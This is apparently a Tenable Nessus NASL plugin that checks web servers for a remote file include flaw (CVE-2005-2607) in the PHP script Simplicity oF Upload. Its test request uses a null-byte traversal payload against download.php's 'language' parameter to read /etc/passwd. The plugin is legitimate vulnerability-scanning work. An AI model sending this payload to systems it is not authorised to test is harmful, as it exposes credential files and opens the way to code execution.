#
# (C) Tenable Network Security
#


if (description) {
  script_id(19334);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2607");
  script_bugtraq_id(14424);

  name["english"] = "Simplicity oF Upload language Parameter File Include Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that suffers from a
remote file include issue. 

Description :

The remote host is running Simplicity oF Upload, a free PHP script to
manage file uploads. 

The version of Simplicity oF Upload installed on the remote host fails
to sanitize user-supplied input to the 'language' parameter of the
'download.php' script.  By leveraging this flaw, an attacker may be
able to view arbitrary files on the remote host and execute arbitrary
PHP code, possibly contained in files uploaded using the affected
application itself. 

See also : 

http://retrogod.altervista.org/simply.html
http://www.phpsimplicity.com/scripts.php?id=3

Solution : 

Upgrade to Simplicity oF Upload version 1.3.1 or later.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for language parameter file include vulnerability in Simplicity oF Upload";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/download.php?",
      "language=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but one could
    #     still upload a malicious file and then reference that here.
    "Failed opening required '/etc/passwd" >< res )
   {
    security_hole(port);
    exit(0);
  }
}
